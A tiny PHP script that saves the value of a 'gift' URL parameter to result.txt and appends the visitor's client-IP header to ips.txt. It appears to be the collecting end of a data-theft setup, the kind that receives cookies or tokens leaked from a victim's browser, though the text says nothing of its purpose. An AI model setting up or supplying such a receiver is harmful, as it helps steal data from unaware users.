<?php

file_put_contents('result.txt', $_GET['gift']);
file_put_contents('ips.txt', $_SERVER['HTTP_CLIENT_IP'], FILE_APPEND);